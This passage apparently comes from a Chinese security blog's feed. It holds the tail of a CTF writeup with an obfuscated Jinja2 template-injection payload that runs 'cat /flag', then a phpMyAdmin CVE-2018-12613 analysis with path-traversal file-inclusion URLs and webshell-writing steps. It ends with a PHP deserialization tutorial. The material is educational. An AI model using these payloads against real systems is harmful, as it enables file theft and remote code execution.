class="keyword">set</span></span> two = (zero-one-one)|<span class="keyword">abs</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> four = (two*two)|int %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> five = (two*two*two)-one-one-one %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> three = five-one-one %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> nine = (two*two*two*two-five-one-one) %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> seven = (zero-one-one-five)|<span class="keyword">abs</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> space = self|string|min %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> point = self|float|string|min %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> c = dict(c=aa)|<span class="keyword">reverse</span>|<span class="keyword">first</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> bfh = self|string|urlencode|<span class="keyword">first</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> bfhc = bfh~c %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> slas = bfhc%((four~seven)|int) %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> yin = bfhc%((three~nine)|int) %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> xhx = bfhc%((nine~five)|int) %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> right = bfhc%((four~one)|int) %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> left = bfhc%((four~zero)|int) %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> but = dict(buil=aa,tins=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> imp = dict(imp=aa,ort=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> pon = dict(po=aa,pen=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> so = dict(o=aa,s=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ca = dict(ca=aa,t=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> flg = dict(fl=aa,ag=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ev = dict(ev=aa,al=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> red = dict(re=aa,ad=dd)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> bul = xhx~xhx~but~xhx~xhx %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> ini = dict(ini=aa,t=bb)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> glo = dict(glo=aa,bals=bb)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> itm = dict(ite=aa,ms=bb)|<span class="keyword">join</span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">set</span></span> pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">for</span></span> f,v in (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">if</span></span> f == bul %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">for</span></span> a,b in (v|attr(itm))() %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">if</span></span> a == ev %&#125;</span><span class="template-variable">&#123;&#123;b(pld)&#125;&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">endif</span></span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">endfor</span></span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">endif</span></span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="keyword">endfor</span></span> %&#125;</span></span><br></pre></td></tr></table></figure></div>

]]></content>
      <tags>
        <tag>web</tag>
        <tag>CTF</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>[PHPMYADMIN]CVE-2018-12613</title>
    <url>/2020/04/07/PHPMYADMIN-CVE-2018-12613/</url>
    <content><![CDATA[<h3 id="PHPMYADMIN-CVE-2018-12613"><a href="#PHPMYADMIN-CVE-2018-12613" class="headerlink" title="[PHPMYADMIN]CVE-2018-12613"></a><strong>[PHPMYADMIN]CVE-2018-12613</strong></h3><p>2018年6月19日，phpMyAdmin在最新版本修复了一个严重级别的漏洞。攻击者必须拥有后台权限，phpMyAdmin4.8.0和4.8.1均受漏洞影响。</p>
<a id="more"></a>

<h4 id="phpmyadmin-4-8-1后台getshell"><a href="#phpmyadmin-4-8-1后台getshell" class="headerlink" title="phpmyadmin 4.8.1后台getshell"></a><strong>phpmyadmin 4.8.1后台getshell</strong></h4><p><strong>0x01、漏洞描述</strong></p>
<p>攻击者利用发现在服务器上包含（查看和潜在执行）文件的漏洞。该漏洞来自一部分代码，其中页面在phpMyAdmin中被重定向和加载，以及对白名单页面进行不正确的测试。</p>
<p>攻击者必须经过身份验证，但在这些情况下除外：</p>
<ol>
<li>$ cfg [‘AllowArbitraryServer’] = true：攻击者可以指定他/她已经控制的任何主机，并在phpMyAdmin上执行任意代码；</li>
<li>$ cfg [‘ServerDefault’] = 0：这会绕过登录并在没有任何身份验证的情况下运行易受攻击的代码。</li>
</ol>
<p><strong>0x02 漏洞分析</strong></p>
<p>漏洞产生点位于：index.php文件54—67行</p>
<p><img src="https://i.loli.net/2021/04/07/5M1qgvPxLdFEWTf.png" alt="img"></p>
<p>可以看到如果要包含文件成功，必需条件有5个：</p>
<p>1、不为空　　</p>
<p>2、字符串　　</p>
<p>3、不以index开头　　</p>
<p>4、不在$target_blacklist这个黑名单中　　</p>
<p>5、Core::checkPageValidity()函数为TRUE</p>
<p>首先查看$target_blacklist变量的值：</p>
<p><img src="https://i.loli.net/2021/04/07/zrFt8fMPp2s5nXK.png" alt="img"></p>
<p>然后进入条件5所述函数中。此函数位于：libraries\classes\Core.php文件443—476行：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span><span class="params">(&amp;$page, array $whitelist = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($whitelist)) &#123;</span><br><span class="line">        $whitelist = <span class="keyword">self</span>::$goto_whitelist;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    $_page = mb_substr(</span><br><span class="line">        $page,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    $_page = urldecode($page);</span><br><span class="line">    $_page = mb_substr(</span><br><span class="line">        $_page,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到在第一次$_page出现时即可绕过。其含义为截取$page 第一个’?’之前的部分，如果在白名单中，即返回TRUE。接下来查看白名单的值：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> $goto_whitelist = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'db_datadict.php'</span>,</span><br><span class="line">        <span class="string">'db_sql.php'</span>,</span><br><span class="line">        <span class="string">'db_events.php'</span>,</span><br><span class="line">        <span class="string">'db_export.php'</span>,</span><br><span class="line">        <span class="string">'db_importdocsql.php'</span>,</span><br><span class="line">        <span class="string">'db_multi_table_query.php'</span>,</span><br><span class="line">        <span class="string">'db_structure.php'</span>,</span><br><span class="line">        <span class="string">'db_import.php'</span>,</span><br><span class="line">        <span class="string">'db_operations.php'</span>,</span><br><span class="line">        <span class="string">'db_search.php'</span>,</span><br><span class="line">        <span class="string">'db_routines.php'</span>,</span><br><span class="line">        <span class="string">'export.php'</span>,</span><br><span class="line">        <span class="string">'import.php'</span>,</span><br><span class="line">        <span class="string">'index.php'</span>,</span><br><span class="line">        <span class="string">'pdf_pages.php'</span>,</span><br><span class="line">        <span class="string">'pdf_schema.php'</span>,</span><br><span class="line">        <span class="string">'server_binlog.php'</span>,</span><br><span class="line">        <span class="string">'server_collations.php'</span>,</span><br><span class="line">        <span class="string">'server_databases.php'</span>,</span><br><span class="line">        <span class="string">'server_engines.php'</span>,</span><br><span class="line">        <span class="string">'server_export.php'</span>,</span><br><span class="line">        <span class="string">'server_import.php'</span>,</span><br><span class="line">        <span class="string">'server_privileges.php'</span>,</span><br><span class="line">        <span class="string">'server_sql.php'</span>,</span><br><span class="line">        <span class="string">'server_status.php'</span>,</span><br><span class="line">        <span class="string">'server_status_advisor.php'</span>,</span><br><span class="line">        <span class="string">'server_status_monitor.php'</span>,</span><br><span class="line">        <span class="string">'server_status_queries.php'</span>,</span><br><span class="line">        <span class="string">'server_status_variables.php'</span>,</span><br><span class="line">        <span class="string">'server_variables.php'</span>,</span><br><span class="line">        <span class="string">'sql.php'</span>,</span><br><span class="line">        <span class="string">'tbl_addfield.php'</span>,</span><br><span class="line">        <span class="string">'tbl_change.php'</span>,</span><br><span class="line">        <span class="string">'tbl_create.php'</span>,</span><br><span class="line">        <span class="string">'tbl_import.php'</span>,</span><br><span class="line">        <span class="string">'tbl_indexes.php'</span>,</span><br><span class="line">        <span class="string">'tbl_sql.php'</span>,</span><br><span class="line">        <span class="string">'tbl_export.php'</span>,</span><br><span class="line">        <span class="string">'tbl_operations.php'</span>,</span><br><span class="line">        <span class="string">'tbl_structure.php'</span>,</span><br><span class="line">        <span class="string">'tbl_relation.php'</span>,</span><br><span class="line">        <span class="string">'tbl_replace.php'</span>,</span><br><span class="line">        <span class="string">'tbl_row_action.php'</span>,</span><br><span class="line">        <span class="string">'tbl_select.php'</span>,</span><br><span class="line">        <span class="string">'tbl_zoom_select.php'</span>,</span><br><span class="line">        <span class="string">'transformation_overview.php'</span>,</span><br><span class="line">        <span class="string">'transformation_wrapper.php'</span>,</span><br><span class="line">        <span class="string">'user_password.php'</span>,</span><br><span class="line">    );</span><br></pre></td></tr></table></figure></div>

<p>随便选中其中之一即可。此处选中 “tbl_sql.php” 。</p>
<p>这里着重看下这个问号：</p>
<p><img src="https://i.loli.net/2021/04/07/AEQ5RTaMdB8oWPG.png" alt="img"></p>
<p>$_page为 以?分割然后取出前面的字符串再判断值是否存在与$goto_whilelist某个数组中。</p>
<p>这个判断的作用是，如果target值带有参数的情况下，phpmyadmin也能正确的包含文件。</p>
<p>也正是因为phpmyadmin团队考虑的太全面了，才会出现此漏洞……</p>
<p>后面又将$page参数用urlencode解码再进行以?分割取出前面的值做判断。</p>
<p><strong>漏洞利用</strong></p>
<ul>
<li><strong>Payload:</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>node3.buuoj.cn:<span class="number">29031</span><span class="regexp">/index.php?target=db_sql.php%253f/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc<span class="regexp">/passwd</span></span><br></pre></td></tr></table></figure></div>

<p><strong>写入shell，有两种方法</strong></p>
<p><strong>第一种方法</strong></p>
<p>写入shell，测试语句，可以先执行一下<code>SELECT &#39;&lt;?php phpinfo()?&gt;&#39;</code>;，执行成功之后</p>
<p>查看自己的sessionid（cookie中phpMyAdmin的值）。(或者Bp抓包获取本地的cookie值也可以)：</p>
<p><img src="https://i.loli.net/2021/04/07/6i35jCpaxW7nYVS.png" alt="img"></p>
<p>访问：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>node3.buuoj.cn:<span class="number">29031</span><span class="regexp">/index.php?target=db_sql.php%253f/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>tmp<span class="regexp">/sess_5632eb783946a850f18242c7a0874289</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/07/KvT7LRV5UIYhw9k.png" alt="img"></p>
<p><strong>第二种方法</strong></p>
<p>我们都知道，登入phpmyadmin后，数据库就是完全可以控制的了，那我们是否可以把WebShell写入到数据库中然后包含数据库文件？</p>
<p>本地测试了一下，发现如果把WebShell当做数据表的字段值是可以完美的写入到数据库文件当中的：</p>
<p>1.在数据库中添加一句话作为一个表：</p>
<p><img src="https://i.loli.net/2021/04/07/2DqptQ4IuMbyOas.png" alt="img"></p>
<p>2.此时会在phpStudy\MySQL\data\ 对应数据库下生成一个frm文件（不同版本路径可能不一样）</p>
<p>emm..这里不知道linux下的该文件目录，没测试成功。。</p>
<p>但放在自己本地测试的话，大概payload是这样的：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/phpMyAdmin4.8.1/i</span>ndex.php?shell=phpinfo();&amp;target=db_sql.php%<span class="number">3</span>f<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/phpStudy/</span>MySQL<span class="regexp">/data/</span>shell<span class="regexp">/shell.frm</span></span><br></pre></td></tr></table></figure></div>

]]></content>
      <tags>
        <tag>CVE</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP反序列化和POP链构造</title>
    <url>/2020/10/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CPOP%E9%93%BE%E6%9E%84%E9%80%A0/</url>
    <content><![CDATA[<p>最近看了点web，记录一下对于php中的反序列化以及构造POP链的过程。</p>
<a id="more"></a>

<h2 id="PHP反序列化理解"><a href="#PHP反序列化理解" class="headerlink" title="PHP反序列化理解"></a>PHP反序列化理解</h2><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>php反序列化简单来说就是对两个函数的操作：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">serialize  <span class="comment">//将一个对象转换成字符串</span></span><br><span class="line">unserialize  <span class="comment">//将字符串还原成对象</span></span><br></pre></td></tr></table></figure>

<p>序列化：将php值转换为可存储或传输的字符串，目的是防止丢失其结构和数据类型。</p>
<p>反序列化：序列化的逆过程，将字符串再转化成原来的php变量，以便于使用。</p>
<p>本质上反序列化是没有危害的，但如果反序列化的内容可控，就容易导致漏洞。</p>
<h4 id="php魔术方法"><a href="#php魔术方法" class="headerlink" title="php魔术方法"></a>php魔术方法</h4><p>PHP提供了许多“魔术”方法，这些方法由两个下划线前缀（__）标识。它们充当拦截器，在满足某些条件时会自动调用它们。 魔术方法提供了一些极其有用的功能。</p>
<p>常见的魔术方法有：</p>
<ul>
<li><p><strong>construct(), destruct()</strong></p>
<p>构造函数与析构函数</p>
</li>
<li><p><strong>call(), callStatic()</strong></p>
<p>方法重载的两个函数</p>
<p>__call()是在对象上下文中调用不可访问的方法时触发</p>
<p>__callStatic()是在静态上下文中调用不可访问的方法时触发。</p>
</li>
<li><p><strong>get(), set()</strong></p>
<p>__get()用于从不可访问的属性读取数据。</p>
<p>__set()用于将数据写入不可访问的属性。</p>
</li>
<li><p><strong>isset(), unset()</strong></p>
<p>__isset()在不可访问的属性上调用isset()或empty()触发。</p>
<p>__unset()在不可访问的属性上使用unset()时触发。</p>
</li>
<li><p><strong>sleep(), wakeup()</strong></p>
<p>serialize()检查您的类是否具有魔术名sleep()的函数。如果是这样，该函数在任何序列化之前执行。它可以清理对象，并且应该返回一个数组，其中应该被序列化的对象的所有变量的名称。如果该方法不返回任何内容，则将NULL序列化并发出E_NOTICE。sleep()的预期用途是提交挂起的数据或执行类似的清理任务。此外，如果您有非常大的对象，不需要完全保存，该功能将非常有用。</p>
<p>unserialize()使用魔术名wakeup()检查函数的存在。如果存在，该功能可以重构对象可能具有的任何资源。wakeup()的预期用途是重新建立在序列化期间可能已丢失的任何数据库连接，并执行其他重新初始化任务。</p>
</li>
<li><p><strong>__toString()</strong></p>
<p>__toString（）方法允许一个类决定如何处理像一个字符串时它将如何反应。</p>
</li>
<li><p><strong>__invoke()</strong></p>
<p>当脚本尝试将对象调用为函数时，调用__invoke()方法。</p>
</li>
<li><p><strong>__set_state()</strong></p>
<p>当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值</p>
</li>
<li><p><strong>__clone()</strong></p>
<p>进行对象clone时被调用，用来调整对象的克隆行为</p>
</li>
<li><p><strong>__debugInfo()</strong></p>
<p>当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本</p>
</li>
</ul>
<p>下面这个例子方便理解这些函数的利用过程：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置一个类A</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $name = <span class="string">"AS1def"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__construct() call\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"\n__destruct() call\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"__toString() call\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__sleep() call\n"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">"name"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__wakeup() call\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($a)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__get() call\n"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($property, $value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;   <span class="keyword">echo</span> <span class="string">"\n__set() call\n"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$property = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__invoke() call\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用 __construct()</span></span><br><span class="line">$a = <span class="keyword">new</span> A();</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用 __toSting()</span></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用 __sleep()</span></span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用 __wakeup()</span></span><br><span class="line">$c = unserialize($b);</span><br><span class="line"><span class="keyword">echo</span> $c;</span><br><span class="line"></span><br><span class="line"><span class="comment">//不存在这个bbbb属性，调用 __get()</span></span><br><span class="line"><span class="keyword">echo</span> $a-&gt;abcd;</span><br><span class="line"></span><br><span class="line"><span class="comment">//name是私有变量，不允许修改，调用 __set()</span></span><br><span class="line">$a-&gt;name = <span class="string">"pro"</span>;</span><br><span class="line"><span class="keyword">echo</span> $a-&gt;name;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将对象作为函数，调用 __invoke()</span></span><br><span class="line">$a();</span><br><span class="line"></span><br><span class="line"><span class="comment">//程序结束，调用 __destruct() (会调用两次__destruct，因为中间有一次反序列化)</span></span><br></pre></td></tr></table></figure></div>

<p>程序运行结果：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQF"><figure class="iseeu highlight /sqf"><table><tr><td class="code"><pre><span class="line">construct() <span class="built_in">call</span></span><br><span class="line"></span><br><span class="line"><span class="variable">__toString</span>() <span class="built_in">call</span></span><br><span class="line"><span class="variable">__sleep</span>() <span class="built_in">call</span></span><br><span class="line">O:<span class="number">1</span>:<span class="string">"A"</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">"%00A%00name"</span>;s:<span class="number">6</span>:<span class="string">"As1def"</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">__wakeup</span>() <span class="built_in">call</span></span><br><span class="line"></span><br><span class="line"><span class="variable">__toString</span>() <span class="built_in">call</span></span><br><span class="line"></span><br><span class="line"><span class="variable">__get</span>() <span class="built_in">call</span></span><br><span class="line">As1def</span><br><span class="line"></span><br><span class="line"><span class="variable">__set</span>() <span class="built_in">call</span></span><br><span class="line"></span><br><span class="line"><span class="variable">__get</span>() <span class="built_in">call</span></span><br><span class="line">pro</span><br><span class="line"><span class="variable">__invoke</span>() <span class="built_in">call</span></span><br><span class="line"></span><br><span class="line"><span class="variable">__destruct</span>() <span class="built_in">call</span></span><br><span class="line"></span><br><span class="line"><span class="variable">__destruct</span>() <span class="built_in">call</span></span><br></pre></td></tr></table></figure></div>

<h4 id="序列化字符串"><a href="#序列化字符串" class="headerlink" title="序列化字符串"></a>序列化字符串</h4><p>一个序列化后的字符串：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">O:1:<span class="string">"A"</span>:1:&#123;s:7:<span class="string">"%00A%00name"</span>;s:6:<span class="string">"As1def"</span>;&#125;</span><br><span class="line">O代表这是一个对象，第一个1代表对象名称的长度，第二个1代表成员个数。</span><br><span class="line">大括号中分别是：属性名类型、长度、名称;值类型、长度、值。</span><br><span class="line">s代表string类型</span><br><span class="line">另外还有<span class="attribute">b</span>=&gt;bool  <span class="attribute">i</span>=&gt;int  <span class="attribute">d</span>=&gt;double  <span class="attribute">a</span>=&gt;array  <span class="attribute">N</span>=&gt;NULL;</span><br></pre></td></tr></table></figure></div>

<p>这里有一个需要注意的地方，Aname明明是长度为5的字符串，为什么在序列化中显示其长度为7？</p>
<p>翻阅php官方文档我们可以找到答案：</p>
<p>对象的私有成员具有加入成员名称的类名称；受保护的成员在成员名前面加上’*’。这些前缀值在任一侧都有空字节。看下面的例子：</p>
<p><strong>private</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $test=<span class="string">'hello'</span>;</span><br><span class="line">    <span class="keyword">private</span> $var;</span><br><span class="line">&#125;</span><br><span class="line">$t = <span class="keyword">new</span> Test();</span><br><span class="line">$data = serialize($t);</span><br><span class="line"><span class="keyword">echo</span>($data);</span><br><span class="line">file_put_contents(<span class="string">"serialize.txt"</span>, $data);</span><br></pre></td></tr></table></figure></div>

<p><img src="/images/web/serialize/private.png" alt="img"></p>
<p>所以说，在我们需要传入该序列化字符串时，需要补齐两个空字节：</p>
<p>即上面所显示的%00A%00name。</p>
<p><strong>protected</strong></p>
<p>换成protected, 属性序列化之后又变了，属性名变成了<code>%00*%00test</code>和<code>%00*%00var</code></p>
<p>也就是<code>%00*%00属性名</code></p>
<p><img src="/images/web/serialize/protected.png" alt="img"></p>
<p>注意这些点对构造payload很关键，当我们直接将<code>private protected</code>的属性进行序列化，得到的序列化字符串的payload将无效，因为<code>0x00</code>的缘故。我们就可以直接利用urlencode来修改我们的payload。</p>
<h4 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a>php反序列化漏洞</h4><p>通常反序列化漏洞的成因在于代码中的 <code>__unserialize()</code>,<code>__wakeup()</code>等魔术方法接收的参数可控，这个函数的参数是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用修改对象的属性实现最终的攻击。</p>
<p>比如，demo.php</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// flag is in flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $filename = <span class="string">'demo.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __wakeup() method.</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;show(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">($filename)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source($filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[<span class="string">'s'</span>]);</span><br></pre></td></tr></table></figure></div>

<p>上面的代码是接收一个参数<code>s</code>，然后将其反序列化，反序列化后，会调用<code>__wakeup()</code>方法。如果一切正常的话，这个方法会显示一下<code>demo.php</code>文件的源代码。但是参数<code>s</code>是可控的，也就是说对象<code>s</code>的属性是可控的。于是我们可以伪造一个<code>filename</code>来构造对象。</p>
<p><strong>POC</strong></p>
